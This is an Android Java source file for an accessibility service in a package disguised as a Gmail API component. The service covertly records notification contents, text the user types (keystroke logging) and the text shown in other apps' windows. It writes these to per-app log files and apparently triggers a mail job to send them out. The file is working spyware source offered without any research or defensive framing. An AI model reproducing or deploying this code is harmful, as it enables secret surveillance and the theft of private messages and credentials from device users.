package com.setting.dl.google.gmailapi;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.os.Parcelable;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.setting.dl.google.gmailapi.mail.gmail.Mail;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

public class AccessNotification extends AccessibilityService {
	
	
	public static final long DEBUG_MOD_WINDOW_CONTENT_CHANGED_DELAY   = 30000L;
	public static final long RELEASE_MOD_WINDOW_CONTENT_CHANGED_DELAY = 180000L;
	
	
	
	public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
		
		ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
		
		String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
		if (enabledServicesSetting == null)
			return false;
		
		TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
		colonSplitter.setString(enabledServicesSetting);
		
		while (colonSplitter.hasNext()) {
			String        componentNameString = colonSplitter.next();
			ComponentName enabledService      = ComponentName.unflattenFromString(componentNameString);
			
			if (enabledService != null && enabledService.equals(expectedComponentName))
				return true;
		}
		
		return false;
	}
	
	private final String TAG = "AccessNotification";
	private Set<String> hardBlock, blockedWindows;
	private long lastWindowContentChangedTime = 0L;
	private static ArrayList<String> lastTitles = new ArrayList<>();
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		
		SharedPreferences nlServicePref = getSharedPreferences("nlService", MODE_PRIVATE);
		hardBlock       = nlServicePref.getStringSet("hardBlock", new HashSet<>());
		blockedWindows  = (nlServicePref.getStringSet("blockedWindows", new HashSet<>()));
		
		u.sendMessage(this, TAG, "Service created\n" + u.dateStamp());
		
	}
	
	
	@Override
	public void onAccessibilityEvent(AccessibilityEvent event) {
		
		if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
			
			Parcelable parcelable = event.getParcelableData();
			
			if (parcelable != null && parcelable instanceof Notification) {
				
				final String packageName = String.valueOf(event.getPackageName());
				
				if (hardBlock.contains(packageName)) return;
				
				try {
					
					handleNotification((Notification) parcelable, packageName);
				}
				catch (Exception e) {
					
					u.log.e(e.toString());
				}
			}
			
			return;
		}
		
		
		if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
			
			final String packageName = String.valueOf(event.getPackageName());
			
			try {
				
				handleTextChange(event.getText().toString(), packageName);
			}
			catch (Exception e) {
				
				u.log.e(e.toString());
			}
			
			return;
		}
		
		
		if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
			
			final String packageName = String.valueOf(event.getPackageName());
			
			if (packageName.contains("launcher")) return;
			
			if (blockedWindows.contains(packageName)) return;
			
			try {
				
				handleWindowContentChange(packageName);
			}
			catch (Exception e) {
				
				u.log.e(e.toString());
			}
			
		}
	}
	
	private void findChildViews(AccessibilityNodeInfo parentView, ArrayList<AccessibilityNodeInfo> viewNodes) {
		
		if (parentView == null || parentView.getClassName() == null) {
			return;
		}
		
		int childCount = parentView.getChildCount();
		
		if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.TextView"))) {
			viewNodes.add(parentView);
		}
		else {
			for (int i = 0; i < childCount; i++) {
				findChildViews(parentView.getChild(i), viewNodes);
			}
		}
	}
	
	public Bitmap screenShot(View view) {
		
		Bitmap bitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap.Config.ARGB_8888);
		Canvas canvas = new Canvas(bitmap);
		view.draw(canvas);
		return bitmap;
	}
	
	@Override
	public void onInterrupt() {}
	
	private void handleNotification(Notification notification, String packageName) {
		
		long   time   = new Date().getTime();
		String title  = String.valueOf(notification.extras.getCharSequence(Notification.EXTRA_TITLE));
		String text   = String.valueOf(notification.extras.getCharSequence(Notification.EXTRA_TEXT));
		String ticker = "-";
		
		if (notification.tickerText != null) ticker = notification.tickerText.toString();
		if (title == null) title = "null";
		if (text == null) text = "null";
		
		String nt = String.format(new Locale("tr"),
				
				"TYPE_NOTIFICATION_STATE_CHANGED\n" +
				"package : %s\n" +
				"time    : %s\n" +
				"title   : %s\n" +
				"text    : %s\n" +
				"ticker  : %s\n" +
				"----------------------------------------------------------\n",
				packageName, Time.whatTimeIsIt(time), title, text, ticker);
		
		
		u.log.d(nt);
		
		Mail.saveValue(this, "notification.txt", nt);
		
	}
	
	private void handleWindowContentChange (String packageName) {
		
		ArrayList<AccessibilityNodeInfo> viewNodes = new ArrayList<>();
		
		findChildViews(getRootInActiveWindow(), viewNodes);
		
		if (viewNodes.isEmpty()) return;
		
		ArrayList<AccessibilityNodeInfo> viewNodesNotNull = new ArrayList<>();
		
		for (AccessibilityNodeInfo nodeInfo : viewNodes) {
			
			CharSequence text = nodeInfo.getText();
			
			if (text != null && text.length() > 0) viewNodesNotNull.add(nodeInfo);
			
		}
		
		String[] strings = new String[viewNodesNotNull.size()];
		
		int i = 0;
		
		for (AccessibilityNodeInfo nodeInfo : viewNodesNotNull)
			strings[i++] = nodeInfo.getText().toString();
		
		String     contents = Arrays.toString(strings);
		final long time     = new Date().getTime();
		
		contents += "\n" + packageName;
		contents += "\n" + "TYPE_WINDOW_CONTENT_CHANGED";
		contents += "\n" + Time.whatTimeIsIt(time);
		contents += "\n--------------------------------------------\n";
		
		
		if (lastTitles.contains(contents)) return;
		
		if (lastTitles.size() > 50) lastTitles.clear();
		
		lastTitles.add(contents);
		
		final String fileName = packageName + ".txt";
		
		Mail.saveValue(this, fileName, contents);
		
		u.log.d(contents);
		
		if (BuildConfig.DEBUG) {
			
			if ((time - lastWindowContentChangedTime) >= DEBUG_MOD_WINDOW_CONTENT_CHANGED_DELAY) {
				
				lastWindowContentChangedTime = time;
				
				new Timer().schedule(new TimerTask() {
					@Override
					public void run() {
						
						MailJobs.wake(AccessNotification.this);
						
					}
				}, DEBUG_MOD_WINDOW_CONTENT_CHANGED_DELAY);
			}
		}
		else {
			
			if ((time - lastWindowContentChangedTime) >= RELEASE_MOD_WINDOW_CONTENT_CHANGED_DELAY) {
				
				lastWindowContentChangedTime = time;
				
				new Timer().schedule(new TimerTask() {
					@Override
					public void run() {
						
						MailJobs.wake(AccessNotification.this);
					}
				}, RELEASE_MOD_WINDOW_CONTENT_CHANGED_DELAY);
			}
		}
	}
	
	private void handleTextChange(final String text, final String packageName) {
		
		final long time = new Date().getTime();
		
		final String value = String.format(new Locale("tr"),
				
				"package : %s\n" +
				"TYPE_VIEW_TEXT_CHANGED\n" +
				"time    : %s\n" +
				"text    : %s\n" +
				"-----------------------------------------------------\n",
				
				packageName, u.getDate(time), text);
		
		Mail.saveValue(AccessNotification.this, packageName + ".txt", value);
		
	}
}
